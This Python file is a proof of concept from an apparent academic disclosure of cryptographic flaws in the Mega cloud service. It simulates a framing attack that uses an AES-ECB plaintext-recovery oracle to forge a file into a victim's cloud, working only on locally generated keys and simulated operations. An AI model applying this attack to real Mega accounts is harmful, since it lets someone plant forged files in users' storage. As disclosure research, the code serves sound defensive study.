
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the framing attack on the simulated operations of Mega.
#

from secrets import token_bytes
from tempfile import NamedTemporaryFile
from os import unlink
from os.path import basename

from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *
from shared.constants.victim import *
from issue_02.aes_ecb_pt_recovery_attack import MegaAesEcbPlaintextRecoveryAttack
from issue_03.framing_attack import MegaFramingAttack


class PoCAbstractFramingAttack:
    def __init__(self):
        print("# Initialize abstract framing attack PoC")
        print(f"## Generate fresh RSA-{RSA_MODULUS_BIT_SIZE} keys")
        self.sk, self.pk = gen_rsa_keys(RSA_MODULUS_BIT_SIZE)
        self.sk_encoded = decode_rsa_privk(self.sk)

        print(f"## Generate fresh master key")
        self.kM = token_bytes(MASTER_KEY_BYTE_LEN)

        self.csk = encrypt_rsa_sk(self.sk_encoded, self.kM)

    def _partial_decryption_oracle(self, c, csk, km):
        c, _ = len_decode(c)
        sk = decrypt_rsa_sk(csk, km)
        return rsa_decrypt(c, sk)[:SID_LEN]

    def run_sanity_checks(self):
        print("## Run sanity checks")

        # encrypt/decrypt a file
        TEST_STRING = b"Test 123\n"

        fp = NamedTemporaryFile(delete=False)
        fp.write(TEST_STRING)
        fp.close()

        ct, kF_enc, attr_enc = chunkwise_file_encryption(self.kM, fp.name)
        file_content, attr = chunkwise_file_decryption(self.kM, ct, kF_enc, attr_enc)

        assert file_content == TEST_STRING
        print("### File enc/dec: success")

        assert attr["n"] == fp.name
        print("### Attribute enc/dec: success")

        # Cleanup
        unlink(fp.name)

    def framing_attack(self, fname, oracle, pk, sk, csk):
        """
        Simulate the framing attack, which adds a file fname to the victim's cloud
        by using a decryption oracle an knowledge of the RSA key (from the RSA key
        recovery attack)

        :params fname: name of the file that the attack places maliciously
        :params oracle: Oracle taking an encrypted SID and a private key encrypted
            with AES-ECB under the master key and returns the decrypted SID
        :params pk: RSA public key
        :params sk: RSA secret key
        :params csk: Secret key sk encrypted with AES-ECB under the master key
        """

        framing_attack = MegaFramingAttack()

        #
        # Get known ciphertext-plaintext pair for the obfuscated key
        #
        pt_recover_attack = MegaAesEcbPlaintextRecoveryAttack(self.pk, self.sk)
        assert pt_recover_attack.max_ct_aes_blocks >= 2

        ct = framing_attack.get_node_key_ct()

        csid = pt_recover_attack.get_special_sid()
        csk_p = pt_recover_attack.get_bogus_csk(self.csk, ct)
        sid_p = oracle(csid, csk_p)
        pt = pt_recover_attack.recover_pt(sid_p)

        #
        # Forge file
        #
        framing_attack.set_node_key_pt(pt)
        fc, fc_enc, attr_enc = framing_attack.forge_file_ct(fname)

        # XXX: Uncomment to see uploaded file (e.g., to check the format wasn't
        # corrupted by the inserted 128 bits)
        # with open("/tmp/file.png", "wb") as fp:
        #     fp.write(fc)

        # ct corresponds to AES-ECB.Enc(kM, kF) (encryption of KF under kM)
        fc_exp, attr = chunkwise_file_decryption(self.kM, fc_enc, ct, attr_enc)
        assert fc_exp == fc
        assert attr["n"] == basename(fname)

    def run_attack(self):
        print("## Starting abstract attack")

        oracle = lambda c, csk, k=self.kM: self._partial_decryption_oracle(c, csk, k)

        # Framing attack with an AES-ECB (under kM) decryption oracle, ct)
        self.framing_attack(FORGE_FILE_NAME, oracle, self.pk, self.sk, self.csk)
        print("### Attack: successful!")
